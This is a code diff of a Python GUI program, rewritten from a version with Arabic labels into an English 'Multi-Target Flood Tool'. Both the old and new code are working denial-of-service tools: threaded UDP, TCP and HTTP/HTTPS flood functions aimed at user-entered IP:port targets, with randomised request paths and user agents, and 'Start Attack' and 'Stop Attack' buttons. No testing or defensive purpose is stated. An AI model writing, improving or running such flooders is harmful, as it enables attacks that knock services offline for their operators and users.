@@ -1,156 +1,152 @@
-import tkinter as tk
-from tkinter import messagebox
-import threading
-import time
 import socket
 import random
+import threading
+import time
 import ssl
+from tkinter import *
+from tkinter import messagebox, ttk
+from colorama import Fore, init
 
-# متغيرات التحكم
-stop_flag = False
-countdown_label = None
+init(autoreset=True)
 
-# سجل واجهة المستخدم
-class Logger:
-    def __init__(self, widget):
-        self.widget = widget
-
-    def log(self, message):
-        self.widget.insert(tk.END, message + "\n")
-        self.widget.see(tk.END)
-
-# وظائف الهجوم
-def udp_flood(ip, port, packet_size, duration, delay):
-    timeout = time.time() + duration
-    while time.time() < timeout and not stop_flag:
+# --- Core Flood Functions ---
+def udp_flood(target_ip, target_port, packet_size, delay, stop_event):
+    while not stop_event.is_set():
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.sendto(random.randbytes(packet_size), (ip, port))
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.sendto(random.randbytes(packet_size), (target_ip, target_port))
             time.sleep(delay)
-        except:
-            continue
+        except Exception as e:
+            print(f"[UDP Error] {e}")
+        finally:
+            sock.close()
 
-def tcp_flood(ip, port, duration, delay):
-    timeout = time.time() + duration
-    while time.time() < timeout and not stop_flag:
+def tcp_flood(target_ip, target_port, delay, stop_event):
+    while not stop_event.is_set():
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip, port))
-            s.send(b"GET / HTTP/1.1\r\nHost: test\r\n\r\n")
-            s.close()
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(3)
+            sock.connect((target_ip, target_port))
+            sock.send(b"GET / HTTP/1.1\r\nHost: %b\r\n\r\n" % target_ip.encode())
             time.sleep(delay)
-        except:
-            continue
+            sock.close()
+        except Exception as e:
+            print(f"[TCP Error] {e}")
 
-def http_flood(ip, port, use_https, duration, delay):
-    timeout = time.time() + duration
-    while time.time() < timeout and not stop_flag:
+def http_flood(target_ip, target_port, use_https, delay, stop_event):
+    while not stop_event.is_set():
         try:
             if use_https:
                 context = ssl.create_default_context()
-                conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=ip)
+                sock = socket.create_connection((target_ip, target_port))
+                sock = context.wrap_socket(sock, server_hostname=target_ip)
             else:
-                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            conn.connect((ip, port))
-            conn.send(b"GET / HTTP/1.1\r\nHost: test\r\n\r\n")
-            conn.close()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.connect((target_ip, target_port))
+
+            user_agent = random.choice([
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+                "AppleWebKit/537.36 (KHTML, like Gecko)",
+                "Chrome/91.0.4472.124 Safari/537.36"
+            ])
+
+            request = f"GET /?{random.randint(1, 9999)} HTTP/1.1\r\n"
+            request += f"Host: {target_ip}\r\n"
+            request += f"User-Agent: {user_agent}\r\n\r\n"
+            sock.send(request.encode())
             time.sleep(delay)
-        except:
-            continue
-
-# تنفيذ الهجوم بعد التجهيز
-def start_attack(mode, targets, duration, packet_size, delay):
-    for ip, port in targets:
-        for _ in range(5):  # عدد الثريدات لكل هدف
-            if mode == "UDP":
-                threading.Thread(target=udp_flood, args=(ip, port, packet_size, duration, delay), daemon=True).start()
-            elif mode == "TCP":
-                threading.Thread(target=tcp_flood, args=(ip, port, duration, delay), daemon=True).start()
-            elif mode == "HTTP":
-                use_https = port == 443
-                threading.Thread(target=http_flood, args=(ip, port, use_https, duration, delay), daemon=True).start()
-
-# إيقاف الهجوم
-def stop_attack():
-    global stop_flag
-    stop_flag = True
-    dashboard.log("⛔ تم إيقاف الهجوم.")
-
-# عرض الوقت المتبقي
-def update_countdown(end_time):
-    remaining = int(end_time - time.time())
-    if remaining >= 0 and not stop_flag:
-        countdown_label.config(text=f"⏳ الوقت المتبقي: {remaining} ثانية")
-        countdown_label.after(1000, update_countdown, end_time)
-    else:
-        countdown_label.config(text="✅ انتهى الهجوم.")
-
-# واجهة المستخدم
-def run_gui():
-    global dashboard, countdown_label
-    window = tk.Tk()
-    window.title("Network Flood Tool")
-    window.geometry("500x600")
-    window.resizable(False, False)
-
-    tk.Label(window, text="🧨 نوع الهجوم:").pack()
-    mode_var = tk.StringVar(value="UDP")
-    tk.OptionMenu(window, mode_var, "UDP", "TCP", "HTTP").pack()
-
-    tk.Label(window, text="🎯 الأهداف (IP:PORT) سطر لكل هدف:").pack()
-    target_text = tk.Text(window, height=5)
-    target_text.pack()
-
-    tk.Label(window, text="⏱️ المدة (ثواني):").pack()
-    duration_entry = tk.Entry(window)
-    duration_entry.insert(0, "60")
-    duration_entry.pack()
-
-    tk.Label(window, text="📦 حجم حزمة UDP:").pack()
-    packet_entry = tk.Entry(window)
-    packet_entry.insert(0, "1024")
-    packet_entry.pack()
-
-    tk.Label(window, text="🔁 تأخير بين الطلبات (ثانية):").pack()
-    delay_entry = tk.Entry(window)
-    delay_entry.insert(0, "0.1")
-    delay_entry.pack()
-
-    countdown_label = tk.Label(window, text="", fg="blue")
-    countdown_label.pack()
-
-    dashboard_box = tk.Text(window, height=15)
-    dashboard_box.pack()
-    dashboard = Logger(dashboard_box)
-
-    def run():
-        global stop_flag
-        stop_flag = False
-        try:
-            mode = mode_var.get()
-            raw_targets = target_text.get("1.0", tk.END).strip().splitlines()
-            targets = []
-            for t in raw_targets:
-                ip, port = t.strip().split(":")
-                targets.append((ip, int(port)))
-
-            duration = int(duration_entry.get())
-            packet_size = int(packet_entry.get())
-            delay = float(delay_entry.get())
-
-            dashboard.log(f"🚀 بدء الهجوم {mode} على {len(targets)} هدف...")
-            start_attack(mode, targets, duration, packet_size, delay)
-
-            end_time = time.time() + duration
-            update_countdown(end_time)
-
+            sock.close()
         except Exception as e:
-            messagebox.showerror("خطأ", str(e))
+            print(f"[HTTP/HTTPS Error] {e}")
 
-    tk.Button(window, text="🔥 بدء الهجوم", command=run, bg="green", fg="white").pack(pady=5)
-    tk.Button(window, text="⛔ إيقاف الهجوم", command=stop_attack, bg="red", fg="white").pack()
+# --- GUI Application ---
+class AttackGUI:
+    def __init__(self, master):
+        self.master = master
+        master.title("Multi-Target Flood Tool")
+        master.geometry("600x500")
+        master.resizable(False, False)
 
-    window.mainloop()
+        self.stop_event = threading.Event()
+        self.threads = []
 
-if __name__ == "__main__":
-    run_gui()
+        self.setup_widgets()
+
+    def setup_widgets(self):
+        Label(self.master, text="Attack Type:").pack(pady=5)
+        self.attack_type = ttk.Combobox(self.master, values=["UDP", "TCP", "HTTP", "HTTPS"])
+        self.attack_type.pack()
+
+        Label(self.master, text="Targets (IP:Port per line):").pack(pady=5)
+        self.targets_text = Text(self.master, height=6)
+        self.targets_text.pack(fill=X, padx=10)
+
+        Label(self.master, text="Duration (seconds):").pack(pady=5)
+        self.duration_entry = Entry(self.master)
+        self.duration_entry.pack()
+
+        Label(self.master, text="UDP Packet Size (if UDP):").pack(pady=5)
+        self.packet_size_entry = Entry(self.master)
+        self.packet_size_entry.insert(0, "1024")
+        self.packet_size_entry.pack()
+
+        Label(self.master, text="Delay between packets (seconds):").pack(pady=5)
+        self.delay_entry = Entry(self.master)
+        self.delay_entry.insert(0, "0.1")
+        self.delay_entry.pack()
+
+        Button(self.master, text="Start Attack", command=self.start_attack).pack(pady=10)
+        Button(self.master, text="Stop Attack", command=self.stop_attack).pack()
+
+        self.progress_label = Label(self.master, text="Idle")
+        self.progress_label.pack(pady=10)
+
+    def start_attack(self):
+        self.stop_event.clear()
+        self.progress_label.config(text="Attack in progress...")
+
+        try:
+            duration = int(self.duration_entry.get())
+            delay = float(self.delay_entry.get())
+            packet_size = int(self.packet_size_entry.get())
+            targets = self.targets_text.get("1.0", END).strip().splitlines()
+            attack_type = self.attack_type.get().upper()
+        except ValueError:
+            messagebox.showerror("Error", "Please enter valid inputs.")
+            return
+
+        for target in targets:
+            try:
+                ip, port = target.split(":")
+                port = int(port)
+
+                if attack_type == "UDP":
+                    t = threading.Thread(target=udp_flood, args=(ip, port, packet_size, delay, self.stop_event))
+                elif attack_type == "TCP":
+                    t = threading.Thread(target=tcp_flood, args=(ip, port, delay, self.stop_event))
+                elif attack_type in ["HTTP", "HTTPS"]:
+                    t = threading.Thread(target=http_flood, args=(ip, port, attack_type == "HTTPS", delay, self.stop_event))
+                else:
+                    messagebox.showerror("Error", "Unknown attack type selected.")
+                    return
+
+                t.start()
+                self.threads.append(t)
+            except Exception as e:
+                messagebox.showerror("Error", f"Failed to parse target: {target}\n{e}")
+
+        threading.Thread(target=self.auto_stop, args=(duration,)).start()
+
+    def stop_attack(self):
+        self.stop_event.set()
+        self.progress_label.config(text="Attack stopped.")
+
+    def auto_stop(self, duration):
+        time.sleep(duration)
+        self.stop_attack()
+        self.progress_label.config(text="Attack finished.")
+
+if __name__ == '__main__':
+    root = Tk()
+    app = AttackGUI(root)
+    root.mainloop()
